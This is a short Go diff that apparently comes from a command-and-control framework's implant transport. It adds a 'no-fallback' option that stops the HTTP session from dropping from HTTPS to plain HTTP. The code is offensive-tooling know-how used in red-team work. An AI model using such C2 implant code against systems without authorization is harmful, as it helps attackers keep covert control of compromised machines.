@@ -71,6 +71,7 @@ type HTTPOptions struct {
 	PollTimeout          time.Duration
 	MaxErrors            int
 	ForceHTTP            bool
+	NoFallback           bool
 	DisableUpgradeHeader bool
 	HostHeader           string
 
@@ -110,6 +111,7 @@ func ParseHTTPOptions(c2URI *url.URL) *HTTPOptions {
 		PollTimeout:          pollTimeout,
 		MaxErrors:            maxErrors,
 		ForceHTTP:            c2URI.Query().Get("force-http") == "true",
+		NoFallback:           c2URI.Query().Get("no-fallback") == "true",
 		DisableUpgradeHeader: c2URI.Query().Get("disable-upgrade-header") == "true",
 		HostHeader:           c2URI.Query().Get("host-header"),
 
@@ -133,7 +135,7 @@ func HTTPStartSession(address string, pathPrefix string, opts *HTTPOptions) (*Sl
 			return client, nil
 		}
 	}
-	if err != nil || opts.ForceHTTP {
+	if (err != nil && !opts.NoFallback) || opts.ForceHTTP {
 		// If we're using default ports then switch to 80
 		if strings.HasSuffix(address, ":443") {
 			address = fmt.Sprintf("%s:80", address[:len(address)-4])
